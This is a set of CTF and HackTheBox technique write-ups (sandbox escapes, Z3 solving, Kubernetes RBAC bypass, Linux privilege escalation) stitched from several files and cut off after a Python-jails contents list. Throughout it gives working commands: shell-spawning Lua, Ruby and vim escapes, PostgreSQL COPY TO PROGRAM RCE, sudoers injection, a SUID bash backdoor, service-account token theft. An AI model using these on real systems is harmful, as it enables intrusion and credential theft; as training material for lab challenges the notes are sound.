:python3 import os; os.system("/home/ctfuser/flagReader /.flag")
:q!
EOF

# Launch rvim with custom vimrc as target user
sudo -u secretuser rvim -u /tmp/evil_vimrc /dev/null

# Alternative: interactive escape once inside rvim
:py3 import os; os.system("/bin/bash")
```

**Key insight:** `rvim` restricts shell commands (`:!cmd`) but Python/Lua/Ruby interfaces remain available. The `:python3` or `:py3` command executes arbitrary Python code, including `os.system()`. If vim was compiled with `+python3`, this bypasses all shell restrictions. Check `:version` for `+python3`, `+lua`, or `+ruby` — any scripting interface escapes the jail.

---

See also: [games-and-vms.md](games-and-vms.md) for WASM patching, Roblox place file reversing, PyInstaller extraction, marshal analysis, Python env RCE, Z3 constraint solving, K8s RBAC bypass, floating-point precision exploitation, and custom assembly language sandbox escape.

See also: [games-and-vms-2.md](games-and-vms-2.md) for cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequences, Brainfuck instrumentation, and WASM memory manipulation.


# games-and-vms

# CTF Misc - Games, VMs & Constraint Solving (Part 1)

## Table of Contents
- [WASM Game Exploitation via Patching](#wasm-game-exploitation-via-patching)
- [Roblox Place File Reversing](#roblox-place-file-reversing)
- [PyInstaller Extraction](#pyinstaller-extraction)
  - [Opcode Remapping](#opcode-remapping)
- [Marshal Code Analysis](#marshal-code-analysis)
  - [Bytecode Inspection Tips](#bytecode-inspection-tips)
- [Python Environment RCE](#python-environment-rce)
- [Z3 Constraint Solving](#z3-constraint-solving)
  - [YARA Rules with Z3](#yara-rules-with-z3)
  - [Type Systems as Constraints](#type-systems-as-constraints)
  - [Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)](#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026)
- [Kubernetes RBAC Bypass](#kubernetes-rbac-bypass)
  - [K8s Privilege Escalation Checklist](#k8s-privilege-escalation-checklist)
- [Floating-Point Precision Exploitation](#floating-point-precision-exploitation)
  - [Finding Exploitable Values](#finding-exploitable-values)
  - [Exploitation Strategy](#exploitation-strategy)
  - [Why It Works](#why-it-works)
  - [Red Flags in Challenges](#red-flags-in-challenges)
  - [Quick Test Script](#quick-test-script)
- [Custom Assembly Language Sandbox Escape (EHAX 2026)](#custom-assembly-language-sandbox-escape-ehax-2026)
- [Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)](#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)
- [Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)](#ruby-sandbox-escape-via-tracepointtrace-hitcon-2017)
- [References](#references)

---

## WASM Game Exploitation via Patching

**Pattern (Tac Tic Toe, Pragyan 2026):** Game with unbeatable AI in WebAssembly. Proof/verification system validates moves but doesn't check optimality.

**Key insight:** If the proof generation depends only on move positions and seed (not on whether moves were optimal), patching the WASM to make the AI play badly produces a beatable game with valid proofs.

**Patching workflow:**
```bash
# 1. Convert WASM binary to text format
wasm2wat main.wasm -o main.wat

# 2. Find the minimax function (look for bestScore initialization)
# Change initial bestScore from -1000 to 1000
# Flip comparison: i64.lt_s -> i64.gt_s (selects worst moves instead of best)

# 3. Recompile
wat2wasm main.wat -o main_patched.wasm
```

**Exploitation:**
```javascript
const go = new Go();
const result = await WebAssembly.instantiate(
  fs.readFileSync("main_patched.wasm"), go.importObject
);
go.run(result.instance);

InitGame(proof_seed);
// Play winning moves against weakened AI
for (const m of [0, 3, 6]) {
    PlayerMove(m);
}
const data = GetWinData();
// Submit data.moves and data.proof to server -> valid!
```

**General lesson:** In client-side game challenges, always check if the verification/proof system is independent of move quality. If so, patch the game logic rather than trying to beat it.

---

## Roblox Place File Reversing

**Pattern (MazeRunna, 0xFun 2026):** Roblox game where the flag is hidden in an older published version. Latest version contains a decoy flag.

**Step 1: Identify target IDs from game page HTML:**
```python
placeId = 75864087736017
universeId = 8920357208
```

**Step 2: Pull place versions via Roblox Asset Delivery API:**
```bash
# Requires .ROBLOSECURITY cookie (rotate after CTF!)
for v in 1 2 3; do
  curl -H "Cookie: .ROBLOSECURITY=..." \
    "https://assetdelivery.roblox.com/v2/assetId/${PLACE_ID}/version/$v" \
    -o place_v${v}.rbxlbin
done
```

**Step 3: Parse .rbxlbin binary format:**
The Roblox binary place format contains typed chunks:
- **INST** — defines class buckets (Script, Part, etc.) and referent IDs
- **PROP** — per-instance property values (including `Source` for scripts)
- **PRNT** — parent→child relationships forming the object tree

```python
# Pseudocode for extracting scripts
for chunk in parse_chunks(data):
    if chunk.type == 'PROP' and chunk.field == 'Source':
        for referent, source in chunk.entries:
            if source.strip():
                print(f"[{get_path(referent)}] {source}")
```

**Step 4: Diff script sources across versions.**
- v3 (latest): `Workspace/Stand/Color/Script` → fake flag
- v2 (older): same path → real flag

**Key lessons:**
- Always check **version history** — latest version may be a decoy
- Roblox Asset Delivery API exposes all published versions
- Rotate `.ROBLOSECURITY` cookie immediately after use (it's a full session token)

---

## PyInstaller Extraction

```bash
python pyinstxtractor.py packed.exe
# Look in packed.exe_extracted/
```

### Opcode Remapping
If decompiler fails with opcode errors:
1. Find modified `opcode.pyc`
2. Build mapping to original values
3. Patch target .pyc
4. Decompile normally

---

## Marshal Code Analysis

```python
import marshal, dis
with open('file.bin', 'rb') as f:
    code = marshal.load(f)
dis.dis(code)
```

### Bytecode Inspection Tips
- `co_consts` contains literal values (strings, numbers)
- `co_names` contains referenced names (function names, variables)
- `co_code` is the raw bytecode
- Use `dis.Bytecode(code)` for instruction-level iteration

---

## Python Environment RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**Other dangerous environment variables:**
- `PYTHONSTARTUP` - Script executed on interactive startup
- `PYTHONPATH` - Inject modules via path hijacking
- `PYTHONINSPECT` - Drop to interactive shell after script

**How PYTHONWARNINGS works:** Setting `PYTHONWARNINGS=ignore::antigravity.Foo::0` triggers `import antigravity`, which opens a URL via `$BROWSER`. Control `$BROWSER` to execute arbitrary commands.

---

## Z3 Constraint Solving

```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
s.add(flag[0] == ord('f'))  # Known prefix
# Add constraints...
if s.check() == sat:
    print(bytes([s.model()[f].as_long() for f in flag]))
```

### YARA Rules with Z3
```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()

# Literal bytes
for i, byte in enumerate([0x66, 0x6C, 0x61, 0x67]):
    s.add(flag[i] == byte)

# Character range
for i in range(4):
    s.add(flag[i] >= ord('A'))
    s.add(flag[i] <= ord('Z'))

if s.check() == sat:
    m = s.model()
    print(bytes([m[f].as_long() for f in flag]))
```

### Type Systems as Constraints
**OCaml GADTs / advanced types encode constraints.**

Don't compile - extract constraints with regex and solve with Z3:
```python
import re
from z3 import *

matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
# Convert to Z3 constraints and solve
```

### Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)

**Pattern (flag-factory-pro):** A "product key" validation system is implemented as a network of 250 boolean logic gates (AND, OR, XOR, NOT) connected by wires. Given 125 boolean input bits and the gate truth values (all gates must output True), find a valid assignment of input bits. This is a classic satisfiability (SAT) problem solvable with Z3.

```python
from z3 import *
import base64

# Parse the gate network from challenge data
data = base64.b64decode(registration_request)
gates = parse_gates(data)  # List of (gate_type, input_wires, output_wire)

# Create 125 boolean variables for input bits
inputs = [Bool(f"x_{i}") for i in range(125)]

# Map wire IDs to Z3 expressions
wires = {i: inputs[i] for i in range(125)}

solver = Solver()
for gate_type, in1, in2, out in gates:
    w1 = wires[in1]
    w2 = wires[in2] if in2 is not None else None

    if gate_type == "AND":
        wires[out] = And(w1, w2)
    elif gate_type == "OR":
        wires[out] = Or(w1, w2)
    elif gate_type == "XOR":
        wires[out] = Xor(w1, w2)
    elif gate_type == "NOT":
        wires[out] = Not(w1)

    # All gate outputs must be True
    solver.add(wires[out] == True)

if solver.check() == sat:
    model = solver.model()
    # Extract 125 bits, encode as base32 in 5-bit groups
    bits = [1 if is_true(model[inputs[i]]) else 0 for i in range(125)]
    # Convert to product key format
    key = bits_to_base32(bits)
    print(f"Product key: {key}")
```

**Key insight:** Boolean logic gate networks are directly expressible as Z3 constraints. Each gate becomes one constraint (`And`, `Or`, `Xor`, `Not`), and the requirement that all outputs are True constrains the solution space. Even with 125 input variables and 250 gates, Z3 solves this in milliseconds. Any "keygen" or "product key" challenge with observable validation logic can be modeled this way.

**When to recognize:** Challenge involves product key validation, license key generation, circuit/gate diagrams, or registration code verification. If the validation logic is extractable (from binary, network capture, or provided spec), model it as a SAT/SMT problem. Z3 handles boolean, bitvector, integer, and real arithmetic constraints.

**References:** BSidesSF 2026 "flag-factory-pro"

---

## Kubernetes RBAC Bypass

**Pattern (CTFaaS, LACTF 2026):** Container deployer with claimed ServiceAccount isolation.

**Attack chain:**
1. Deploy probe container that reads in-pod ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
2. Verify token can impersonate deployer SA (common misconfiguration)
3. Create pod with `hostPath` volume mounting `/` -> read node filesystem
4. Extract kubeconfig (e.g., `/etc/rancher/k3s/k3s.yaml`)
5. Use node credentials to access hidden namespaces and read secrets

```bash
# From inside pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
```

### K8s Privilege Escalation Checklist
- Check RBAC: `kubectl auth can-i --list`
- Look for pod creation permissions (can create privileged pods)
- Check for hostPath volume mounts allowed in PSP/PSA
- Look for secrets in environment variables of other pods
- Check for service mesh sidecars leaking credentials

---

## Floating-Point Precision Exploitation

**Pattern (Spare Me Some Change):** Trading/economy games where large multipliers amplify tiny floating-point errors.

**Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.

### Finding Exploitable Values
```python
mult = 1000000000000000  # 10^15

# Find values where multiplication creates useful fractional errors
for i in range(1, 100):
    x = i / 100.0
    result = x * mult
    frac = result - int(result)
    if frac > 0:
        print(f'x={x}: {result} (fraction={frac})')

# Common values with positive fractions:
# 0.07 -> 70000000000000.0078125
# 0.14 -> 140000000000000.015625
# 0.27 -> 270000000000000.03125
# 0.56 -> 560000000000000.0625
```

### Exploitation Strategy
1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
2. **Find favorable FP error**: Value where `x * mult` has positive fraction
3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"

**Example (time-travel trading game):**
```text
Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
Multiplier: 1e15 (time travel)

# Buy 0.56, travel through time:
balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
inventory = 0.56 * 1e15 = 560000000000000.0625

# Sell exactly 560000000000000 (integer part):
balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee

# Now: balance >= flag_price AND inventory >= fee
```

### Why It Works
- Float64 has ~15-16 significant digits precision
- `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
- `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
- The asymmetric rounding gives you slightly more total value than you started with

### Red Flags in Challenges
- "Time travel amplifies everything" (large multipliers)
- Trading games with buy/sell + special actions
- Decimal currency with fees or thresholds
- "No decimals allowed" after certain operations (forces integer transactions)
- Starting values that seem impossible to win with normal math

### Quick Test Script
```python
def find_exploit(mult, balance_needed, inventory_needed):
    """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
    for i in range(1, 500):
        x = i / 100.0
        if x >= 5.0:  # Can't buy more than balance
            break
        inv_after = x * mult
        bal_after = (5.0 - x) * mult

        # Sell integer part of inventory
        sell = int(inv_after)
        final_bal = bal_after + sell
        final_inv = inv_after - sell

        if final_bal >= balance_needed and final_inv >= inventory_needed:
            print(f'EXPLOIT: buy {x}, sell {sell}')
            print(f'  final_balance={final_bal}, final_inventory={final_inv}')
            return x
    return None

# Example usage:
find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
```

---

## Custom Assembly Language Sandbox Escape (EHAX 2026)

**Pattern (Chusembly):** Web app with custom instruction set (LD, PUSH, PROP, CALL, IDX, etc.) running on a Python backend. Safety check only blocks the word "flag" in source code.

**Key insight:** `PROP` (property access) and `CALL` (function invocation) instructions allow traversing Python's MRO chain from any object to achieve RCE, similar to Jinja2 SSTI.

**Exploit chain:**
```text
LD 0x48656c6c6f A     # Load "Hello" string into register A
PROP __class__ A      # str → <class 'str'>
PROP __base__ E       # str → <class 'object'> (E = result register)
PROP __subclasses__ E # object → bound method
CALL E                # object.__subclasses__() → list of all classes
# Find os._wrap_close at index 138 (varies by Python version)
IDX 138 E             # subclasses[138] = os._wrap_close
PROP __init__ E       # get __init__ method
PROP __globals__ E    # access function globals
# Use __getitem__ to access builtins without triggering keyword filter
PUSH 0x5f5f6275696c74696e735f5f  # "__builtins__" as hex
CALL __getitem__ E               # globals["__builtins__"]
# Bypass "flag" keyword filter with hex encoding
PUSH 0x666c61672e747874          # "flag.txt" as hex
CALL open E                      # open("flag.txt")
CALL read E                      # read file contents
STDOUT E                         # print flag
```

**Filter bypass techniques:**
- **Hex-encoded strings:** `0x666c61672e747874` → `"flag.txt"` bypasses keyword filters
- **os.popen for shell:** If file path is unknown, use `os.popen('ls /').read()` then `os.popen('cat /flag*').read()`
- **Subclass index discovery:** Iterate through `__subclasses__()` list to find useful classes (os._wrap_close, subprocess.Popen, etc.)

**General approach for custom language challenges:**
1. **Read the docs:** Check `/docs`, `/help`, `/api` endpoints for instruction reference
2. **Find the result register:** Many custom languages have a special register for return values
3. **Test string handling:** Try hex-encoded strings to bypass keyword filters
4. **Chain Python MRO:** Any Python string object → `__class__.__base__.__subclasses__()` → RCE
5. **Error messages leak info:** Intentional errors reveal Python internals and available classes

---

## Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)

Lua sandboxes that filter `load()` and `os.execute()` by name can be bypassed if function references exist in other accessible tables or through string concatenation of function names.

```lua
-- Common Lua sandbox restrictions:
-- os.execute blocked, load blocked, require blocked

-- Bypass 1: If string.find is available, use it to test for allowed functions
-- then access via table indexing
local f = os["execute"]  -- table index bypass if only os.execute() call is blocked
f("cat /flag")

-- Bypass 2: Use loadstring (alias for load in Lua 5.1)
loadstring("os.execute('cat /flag')")()

-- Bypass 3: Via debug library (if available)
debug.getregistry()  -- access internal Lua registry

-- Bypass 4: Bytecode execution (compile outside, load bytecode)
-- Compile payload: luac -o payload.luac payload.lua
-- Load bytecode in sandbox (may bypass source-level filters)

-- Bypass 5: Concatenation to build function names
local cmd = "exe" .. "cute"
os[cmd]("cat /flag")

-- Bypass 6: Via io library
io.popen("cat /flag"):read("*a")
```

**Key insight:** Lua sandboxes typically filter specific function *calls* but not *table lookups*. Access blocked functions through table indexing (`os["execute"]`), string concatenation for function names, or alternate I/O libraries (`io.popen`). Also check if `loadstring` (Lua 5.1 alias for `load`) is unblocked.

---

## Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)

**Pattern:** Ruby sandbox uses `set_trace_func` to monitor execution and block dangerous calls. Bypass: register a `TracePoint` hook for `:c_call` events. TracePoint fires at the C-extension level, before Ruby-level `set_trace_func` hooks activate.

```ruby
TracePoint.trace(:c_call) do |tp|
  system('sh')
end
```

The hook fires on the next C-level call (e.g., `puts`, any method call), executing `system('sh')` before the sandbox monitor can intercept it.

**Why it works:** `TracePoint` (introduced in Ruby 2.0) operates at a lower level than `set_trace_func`. `:c_call` hooks fire when any C-implemented method is invoked, which happens before the Ruby event system that `set_trace_func` relies on processes the event.

**Key insight:** `TracePoint` operates at a lower level than `set_trace_func` in Ruby — C-call hooks fire before Ruby-level event hooks, allowing sandbox escape. Any subsequent C-method call (even benign ones) triggers the payload.

---

## References
- Pragyan 2026 "Tac Tic Toe": WASM minimax patching
- LACTF 2026 "CTFaaS": K8s RBAC bypass via hostPath
- 0xL4ugh CTF: PyInstaller + opcode remapping
- 0xFun 2026 "MazeRunna": Roblox version history + binary place file parsing
- EHAX 2026 "Chusembly": Custom assembly language with Python MRO chain RCE
- HITCON 2017: Ruby TracePoint sandbox escape

---

See also: [games-and-vms-2.md](games-and-vms-2.md) for cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequences, Brainfuck instrumentation, and WASM memory manipulation.

See also: [games-and-vms-3.md](games-and-vms-3.md) for memfd_create packed binaries, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, emulator ROM-switching state preservation, Python marshal code injection, Benford's Law bypass, parallel connection oracle relay, nonogram solver pipelines, 100 prisoners problem, C code jail escape via emoji identifiers, and BuildKit daemon build secret exploitation.


# linux-privesc

# Linux Privilege Escalation and Service Exploitation

Techniques from HackTheBox machine writeups covering sudo abuse, service misconfigurations, database exploitation, and credential extraction.

## Table of Contents

- [Sudo Wildcard Parameter Injection via fnmatch (Dump HTB)](#sudo-wildcard-parameter-injection-via-fnmatch-dump-htb)
- [Crafted Pcap for /etc/sudoers.d (Dump HTB)](#crafted-pcap-for-etcsudoersd-dump-htb)
- [Monit confcheck Process Command-Line Injection (Zero HTB)](#monit-confcheck-process-command-line-injection-zero-htb)
- [Apache -d Last-Wins ServerRoot Override (Zero HTB)](#apache--d-last-wins-serverroot-override-zero-htb)
- [Backup Cronjob SUID Abuse (Slonik HTB)](#backup-cronjob-suid-abuse-slonik-htb)
- [PostgreSQL COPY TO PROGRAM RCE (Slonik HTB)](#postgresql-copy-to-program-rce-slonik-htb)
- [PostgreSQL Backup Credential Extraction (Slonik HTB)](#postgresql-backup-credential-extraction-slonik-htb)
- [SSH Unix Socket Tunneling (Slonik HTB)](#ssh-unix-socket-tunneling-slonik-htb)
- [NFS Share Exploitation for Sensitive Data (Slonik HTB)](#nfs-share-exploitation-for-sensitive-data-slonik-htb)
- [PaperCut Print Deploy Privilege Escalation (Bamboo HTB)](#papercut-print-deploy-privilege-escalation-bamboo-htb)
- [Squid Proxy Pivoting to Internal Services (Bamboo HTB)](#squid-proxy-pivoting-to-internal-services-bamboo-htb)
- [Zabbix Admin Password Reset via MySQL (Watcher HTB)](#zabbix-admin-password-reset-via-mysql-watcher-htb)
- [WinSSHTerm Encrypted Credential Decryption (Atlas HTB)](#winsshterm-encrypted-credential-decryption-atlas-htb)

---

## Sudo Wildcard Parameter Injection via fnmatch (Dump HTB)

Sudo's `fnmatch()` matches `*` across argument boundaries including spaces, allowing injection of extra flags into a locked-down sudo command.

Example: sudoers rule has `/usr/bin/tcpdump -c10 -w/var/cache/captures/*/[UUID]` — the `*` matches `x -Z root -r/path -w/etc/sudoers.d`

- `-Z root` prevents privilege dropping (file stays root-owned)
- Second `-w` overrides first (tcpdump uses last value)
- `-r` reads from crafted pcap instead of live capture

```bash
sudo /usr/bin/tcpdump -c10 \
  -w/var/cache/captures/x \
  -Z root \
  -r/var/cache/captures/.../crafted.pcap \
  -w/etc/sudoers.d/output_uuid \
  -F/var/cache/captures/filter.uuid
```

**Key insight:** Sudo wildcards use `fnmatch()` without `FNM_PATHNAME`, so `*` matches any characters including spaces and slashes. This means a single `*` in a sudoers rule can match across multiple injected arguments.

---

## Crafted Pcap for /etc/sudoers.d (Dump HTB)

Sudo's yacc parser has error recovery — it skips binary junk lines and keeps parsing for valid entries. Vixie cron, by contrast, rejects the entire file on the first syntax error. Craft a pcap with an embedded sudoers line: `\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n`

Avoid `0x0a` (newline) bytes in binary headers: use IPs like 192.168.x.x (not 10.x.x.x) and select ports/timestamps carefully. The valid sudoers entries appear between binary junk lines.

```python
# Payload embedded in each UDP packet
payload = b"\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n"
# Avoid 10.x.x.x IPs (0x0a byte = newline in binary headers)
# Use 192.168.1.1/192.168.1.2, ports 12345/9999, timestamps 100-109
```

**Key insight:** Sudo's parser recovers from errors (yacc `error` productions skip to next newline) while cron's parser rejects the entire file on the first syntax error. This makes `/etc/sudoers.d/` a viable target for binary-format file injection while `/etc/cron.d/` is a dead end.

---

## Monit confcheck Process Command-Line Injection (Zero HTB)

Monit runs health-check scripts as root every 60 seconds. The script uses `pgrep -lfa` to find processes matching a regex, extracts their command line, modifies it (e.g., replaces `apache2` with `apache2ctl`), and executes the result as root.

Create a fake process with injected extra flags in its command line. Perl's `$0` assignment sets an arbitrary process name visible to `pgrep`:

```bash
# Monit confcheck script pattern:
# pgrep -lfa "^/opt/app/bin/apache2.-k.start.-d./opt/app/conf"
# -> replaces apache2->apache2ctl, appends -t, executes as root

# Inject extra flags via fake process:
perl -e '$0 = "/opt/app/bin/apache2 -k start -d /opt/app/conf -d /dev/shm/malconf -E /dev/shm/malconf/startup.log"; sleep 300' &
```

**Key insight:** When a root script uses `pgrep` to extract a process command line and then executes a modified version, creating a fake process with extra arguments allows injecting flags into root-executed commands. Perl's `$0` or Python's `setproctitle` make process name spoofing trivial.

---

## Apache -d Last-Wins ServerRoot Override (Zero HTB)

When multiple `-d` flags are specified, Apache uses the last one. Combined with `-E` (startup error log redirect), this provides both config control and output capture. Place `Include /root/root.txt` in a malicious config — Apache tries to parse the flag file as a directive and dumps its content in the error message.

```bash
# Create malicious Apache config
mkdir -p /dev/shm/malconf
cat > /dev/shm/malconf/apache2.conf << 'EOF'
ServerRoot "/etc/apache2"
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
Include /root/root.txt
EOF

# Fake process injects -d (override ServerRoot) and -E (error log to readable file)
# After monit triggers confcheck, read error log:
cat /dev/shm/malconf/startup.log
# AH00526: Syntax error on line 1 of /root/root.txt:
# Invalid command 'FLAG_CONTENT_HERE'...
```

**Key insight:** Apache config parse errors expose file content in error messages. `Include /path/to/file` causes Apache to read the file and report its content as an "Invalid command" error — a reliable file-read primitive when combined with `-E` output redirection.

---

## Backup Cronjob SUID Abuse (Slonik HTB)

Root cronjob copies files from a user-controlled directory (e.g., PostgreSQL data directory). Place a SUID (Set User ID) bash binary in the source directory — when the cronjob copies it, the file becomes root-owned while retaining the SUID bit.

```sql
-- Copy bash with SUID to PostgreSQL data directory
COPY (SELECT '') TO PROGRAM 'cp /bin/bash /var/lib/postgresql/14/main/bash && chmod 4777 /var/lib/postgresql/14/main/bash';
-- After backup cronjob runs, the copy at /opt/backups/current/bash is root-owned SUID
-- Execute: /opt/backups/current/bash -p
```

**Key insight:** When a root cronjob copies an entire directory, file ownership changes to root. SUID binaries in the source become root-owned SUID in the destination. The `-p` flag on bash preserves effective UID.

---

## PostgreSQL COPY TO PROGRAM RCE (Slonik HTB)

PostgreSQL superuser can execute OS commands via `COPY TO PROGRAM`. Read command output by writing to a temp file and using `pg_read_file()`.

```sql
-- Execute commands as postgres user
COPY (SELECT '') TO PROGRAM 'id > /tmp/test.txt';
SELECT pg_read_file('/tmp/test.txt');
-- uid=115(postgres) gid=123(postgres)

-- Read arbitrary files
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/var/lib/postgresql/user.txt');
```

**Key insight:** PostgreSQL superuser access is equivalent to OS command execution. `COPY TO PROGRAM` runs shell commands as the `postgres` user, and `pg_read_file()` reads arbitrary files on the filesystem without needing shell access.

---

## PostgreSQL Backup Credential Extraction (Slonik HTB)

`pg_basebackup` archives contain password hashes in `pg_authid` (file `global/1260`). SCRAM-SHA-256 hashes (format: `SCRAM-SHA-256$4096:salt$stored_key:server_key`) can be cracked offline. Restore the backup locally with Docker to access full database contents.

```bash
# Mount NFS share, extract backup zip
showmount -e TARGET && mount -t nfs TARGET:/var/backups /mnt
# Extract pg_authid from global/1260 for password hashes
# Restore backup: docker run -v /path/to/backup:/var/lib/postgresql/data postgres:14
# Connect and dump user tables for credentials
```

**Key insight:** PostgreSQL backups (`pg_basebackup`) contain `global/1260` which holds `pg_authid` -- the table with all password hashes. SCRAM-SHA-256 hashes can be cracked offline, and restoring the full backup in Docker gives access to all database contents including application credentials.

---

## SSH Unix Socket Tunneling (Slonik HTB)

When a service only listens on a Unix socket (not TCP), use SSH local port forwarding to tunnel traffic to it. Works even when the user has `/bin/false` as login shell — the `-T -fN` flags skip terminal allocation and command execution.

```bash
# Forward local port 25432 to remote PostgreSQL Unix socket
sshpass -p 'password' ssh -T -o StrictHostKeyChecking=no \
  -fNL 25432:/var/run/postgresql/.s.PGSQL.5432 user@TARGET
# Connect via forwarded port
PGPASSWORD='postgres' psql -h localhost -p 25432 -U postgres
```

**Key insight:** SSH `-L localport:unix_socket_path` forwards to Unix sockets, not just TCP ports. `-T` prevents terminal allocation, `-f` backgrounds SSH, `-N` prevents command execution — together these work even with restricted shells like `/bin/false`.

---

## NFS Share Exploitation for Sensitive Data (Slonik HTB)

Enumerate and mount NFS (Network File System) shares to find database backups, SSH keys, and config files with credentials:
```bash
showmount -e TARGET
# /var/backups (everyone)
# /home        (everyone)
mount -t nfs TARGET:/var/backups /mnt/backups
mount -t nfs TARGET:/home /mnt/home
# Check for: database backups, SSH keys, config files with credentials
```

**Key insight:** NFS shares exported with `(everyone)` access require no authentication. Always check `showmount -e` early in enumeration -- exposed `/home` directories often contain SSH keys, and `/var/backups` frequently holds database dumps with credentials.

---

## PaperCut Print Deploy Privilege Escalation (Bamboo HTB)

Root-owned systemd service (`pc-print-deploy`) runs binaries from a user-owned directory (`/home/papercut/`). The `server-command` shell script, owned by the `papercut` user, executes as root during certain admin operations. Modify this user-owned script to inject a payload, then trigger execution via admin API.

```bash
# Modify user-owned script that root executes
echo 'chmod u+s /bin/bash' >> ~/server/bin/linux-x64/server-command

# Trigger root execution via PaperCut admin API
curl -c /tmp/cookies.txt "http://localhost:9191/app?service=page/SetupCompleted"
curl -b /tmp/cookies.txt "http://localhost:9191/print-deploy/admin/api/mobilityServers/v2?refresh=true"

# Execute SUID bash
bash -p
```

**Key insight:** When a root-owned service runs binaries or scripts from a user-writable directory, check `ls -la` on every file in the execution path. The systemd service file (`/etc/systemd/system/`) defines `ExecStart` but may lack `User=` directive, running everything as root.

---

## Squid Proxy Pivoting to Internal Services (Bamboo HTB)

Route traffic through a Squid proxy to reach internal services not directly accessible:
```bash
# Enumerate internal services through Squid proxy
curl -x http://TARGET:3128 http://127.0.0.1:9191/app
curl -x http://TARGET:3128 http://127.0.0.1:8080/
# Set proxy for all tools:
export http_proxy=http://TARGET:3128
```

**Key insight:** Squid proxies on port 3128 are a pivot point to internal services bound to 127.0.0.1. Set `http_proxy` globally and access internal admin panels, databases, and APIs that are invisible from external scans.

---

## Zabbix Admin Password Reset via MySQL (Watcher HTB)

With MySQL access to the Zabbix database, reset the admin password directly:
```sql
-- Reset Zabbix admin password to "zabbix" (bcrypt hash)
UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
-- Note: username is case-sensitive ("Admin" not "admin")
```

**Key insight:** With direct MySQL access to a Zabbix database, update the `users` table to set a known bcrypt hash as the admin password. The username is case-sensitive (`Admin` not `admin`), which is a common gotcha.

---

## WinSSHTerm Encrypted Credential Decryption (Atlas HTB)

WinSSHTerm (.NET) stores encrypted SSH credentials in `connections.xml` with key material in a `key` file. Decompile with ILSpy/dnSpy to reverse the multi-layer encryption:

1. **Layer 1:** Key file decrypted with PBKDF2-HMAC-SHA1 (Password-Based Key Derivation Function 2) using 1012 iterations, obfuscated prefix + master password + suffix, and a hardcoded salt
2. **Layer 2:** Decrypted key split into PasswordKey (even bytes, bitwise NOT'd) and SaltKey (odd bytes, NOT'd)
3. **Layer 3:** Stored password decrypted with PBKDF2 derived from PasswordKey/SaltKey
4. Master password often crackable with rockyou.txt
5. XOR obfuscated string table: `data[i] = (data[i] ^ i) ^ 0xAA`

**Key insight:** Desktop SSH clients with "encrypted" credential storage are only as strong as the master password. Decompile the .NET binary, extract the crypto constants, and brute-force the master password. The encryption scheme's complexity is irrelevant if the master password is weak.


# pyjails

# CTF Misc - Python Jails

## Table of Contents
- [Identifying Jail Type](#identifying-jail-type)
- [Systematic Enumeration](#systematic-enumeration)
  - [Test Basic Features](#test-basic-features)
  - [Test Blocked AST Nodes](#test-blocked-ast-nodes)
  - [Brute-Force Function Names](#brute-force-function-names)
- [Oracle-Based Challenges](#oracle-based-challenges)
  - [Binary Search](#binary-search)
  - [Linear Search](#linear-search)
- [Building Strings Without Concat](#building-strings-without-concat)
- [Classic Escape Techniques](#classic-escape-techniques)
  - [Via Class Hierarchy](#via-class-hierarchy)
  - [Compile Bypass](#compile-bypass)
  - [Unicode Bypass](#unicode-bypass)
  - [Getattr Alternatives](#getattr-alternatives)
- [Walrus Operator Reassignment](#walrus-operator-reassignment)
  - [Octal Escapes](#octal-escapes)
- [Magic Comment Escape](#magic-comment-escape)
- [Mastermind-Style Jails](#mastermind-style-jails)
  - [Find Input Length](#find-input-length)
  - [Find Characters](#find-characters)
  - [Find Positions](#find-positions)
- [Server Communication](#server-communication)
- [Magic File ReDoS](#magic-file-redos)
- [Environment Variable RCE](#environment-variable-rce)
- [func_globals to Module Chain Traversal (PlaidCTF 2013)](#func_globals-to-module-chain-traversal-plaidctf-2013)
- [Restricted Charset Number Generation (PlaidCTF 2013)](#restricted-charset-number-generation-plaidctf-2013)
- [Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)](#multi-stage-payload-with-class-attribute-persistence-plaidctf-2013)
